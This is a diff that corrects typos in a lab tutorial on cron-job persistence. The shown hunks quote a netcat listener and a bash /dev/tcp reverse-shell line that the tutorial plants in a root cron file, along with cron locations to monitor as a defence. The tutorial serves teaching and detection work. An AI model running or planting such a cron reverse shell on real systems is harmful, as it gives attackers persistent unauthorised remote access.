@@ -29,7 +29,7 @@ We will see how attackers use this at user-level and root-level.
 
 ### 1). Start the Attacker Listener
 
-Fisrt we will start netcat listner on port 4444 to catch callback,
+First we will start netcat listner on port 4444 to catch callback,
 
 #### nc -lvnp 4444
 
@@ -55,7 +55,7 @@ Ok now all is done this cron job will execute on every minute and and let's go o
 
 ![answer](reverse_shell.png)
 
-We successfuly got shell from our ubuntu machine (192.168.1.6).
+We successfully got shell from our ubuntu machine (192.168.1.6).
 
 This is how attackers use cron jobs using user-level privileges now let see how attackers use root-level crons with high-level privileges.
 
@@ -72,9 +72,9 @@ And we will add same reverse shell in this file,
 
 #### bash -c 'exec bash -i &>/dev/tcp/192.168.1.7/4444 <&1'
 
-- bash -c:- It will start a new bash shell instance and executes the string of commands contained inside the single quots.
+- bash -c:- It will start a new bash shell instance and executes the string of commands contained inside the single quotes.
 
-- exec:- I will replaces the current shell process with the newly specified command instead of running it as a subprocess.
+- exec:- It will replaces the current shell process with the newly specified command instead of running it as a subprocess.
 
 - bash -i:- It will invoke bash in interactive mode.
 
@@ -161,7 +161,7 @@ As we can see every entries of root-level cron job which we created.
 ### 1). Least Privilege
 
 ### 2). Monitor Cron changes
-Continusoly monitor this locations,
+Continuously monitor this locations,
 
 - /etc/crontab
 - /etc/cron.d/
